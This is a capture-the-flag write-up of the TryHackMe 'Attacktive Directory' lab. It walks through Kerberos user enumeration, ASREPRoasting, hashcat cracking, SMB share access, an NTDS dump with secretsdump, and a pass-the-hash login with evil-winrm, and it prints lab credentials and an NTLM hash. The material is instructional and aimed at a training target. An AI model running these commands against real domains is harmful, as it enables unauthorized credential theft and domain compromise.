---
layout: default
---

# TryHackMe - Attacktive Directory

This post is a writeup of the TryHackMe Attacktive Directory CTF. In this CTF we'll be Enumerating, Exploiting, and Escalating Privileges on a vunlnerable Domain Controller. 

Before we begin, we need to download a few tools per the room requirements. 

Those being impacket, bloodhound, and neo4j. 

To download and install run the following commands

```
git clone https://github.com/SecureAuthCorp/impacket.git
```
```
pip3 install -r requirements.txt
```
```
python3 ./setup.py install
```

To install bloodhound and neo4j run the following commands

```
apt install bloodhound neo4j
```

After these have been installed make sure to update your Kali VM
```
apt update
```

## Enumeration - Welcome to Attacktive Directory

Questions 

1. What tool will allow us to enumerate port 139/445?
2. What is the NetBIOS-Domain Name of the Machine?
3. What invalid TLD do people commonly use for their Active Directory Domain?

The first question is pretty easy. A simple google search of 'enumeration with kali linux' will give us the name of the tool installed in kali linux that can enumerate. 



For the second and third question we need to perform a nmap scan with the '-A' option. 





Pretty easy so far. 

## Enumeration - Enumerating Users via Kerberos



Questions 

1. What command within Kerbrute will allow us to enumerate valid usernames?
2. What notable account is discovered?
3. What is the other notable account?

According to the intro, the host is running Kerberos. We can also see from our nmap scan that port 88, port Kerberos uses, is open.  

The room recommends downloading the tool Kerbrute and downloading a user list and password list. 



Once eveything is download we are going to run the following command. 

```
./kerbrute_linux_amd64 userenum --dc TARGET IP -d spookysec.local userlist.txt
```

Here we can see a few interesting accounts that answer questions two and three. 

## Exploitation - Abusing Kerberos


Questions 

1. We have two user account that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
2. Looking at the Hashcat examples Wiki page, what type of Kerberos hash did we retrieve from the KDC?
3. What mode is the hash?
4. Now crack the hash with the modeified password list provided, what is the user accounts password?


In this section we are going to performing an ASREPRoasting attack with the user accounts we enumerated in the last section. 

Run the following command. 

```
python3 impacket/examples/GetNPUsers.py -dc-ip TARGET IP -usersfile USERS FILE spookysec.local/
```

This command will provide us the answer to question one. 

From we can navigate to the following webpage to find the answers to questions two and three. 
https://hashcat.net/wiki/doku.php?id=example_hashes

Armed with this information, let's use hashcat to crack the hash. 

Run the following command. 

```
hashcat -m 18200 HASH FILE passwordlist.txt
```

The password to the user account and the answer to question four is at the end of the hash.


## Enumeration - Back to the Basics

With the user's credentials, we can use them to enumerate shares.

1. What utility can we use to map remote SMB shares?
2. Which option will list shares?
3. How many remote shares is the server listing?
4. There is one particular share that we have access to that contains a text file. Which share is it?
5. What is the content of the file?
6. Decoding the contents of the file, wha tis the full contents?

Google searching 'Kali Linux SMB' will provide us with a few options on how to map SMB shares and the answers to questions one and two. 

The following page list the commands we'll be using. 

Run the following command to list the shares and get the answers to questions three. 
```
smbclient -L TARGET IP -U spookysec.local/svc-admin%management2005
```



Now that we have the list of shares. Let's try and connect to each of them and see if we find anything interesting.

Run the following command.

```
smbclient //TARGET IP/ADMIN$ -U svc-admin
```
For the first share we get an access denied. Let's try the second one. 


We can access the second share with an interesting txt file. Use 'more' to view the content of the file. With this information we can answer questions four and five.

Copy the string, throw it in CyberChef, and use the Magic function to decode it.


## Domain Privilege Escalation - Elvating Privileges within the Domain




Questions
1. What method allowed us to dump NTDS.DIT?
2. What is the Administrators NTLM hash?
3. What method of attack could allow us to authenticate as the user without the password?
4. Using a tool called Evil-WinRM what option will allow us to use a hash?


The intro mentions to use secretsdump.py to retrieve password hashes. 

Run the following command to get the hashes and the answers to questions one and two.

```
python3 impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup251786@TARGET IP
```

The answer to question 3 is pretty easy, if you don't know copy and paste it into Google.

Question four is asking us to use Evil-WinRM. Use the '-h' option to list the available features or go to the following webpage to get a detailed guide https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/ and the answer to the question. 


## Flag Submission 

Run the following command to execute the pass the hash attack and connect to the remote host. 

```
evil-winrm -i TARGET IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
From here navigate through the directory to find and submit the flags.











[back](./)
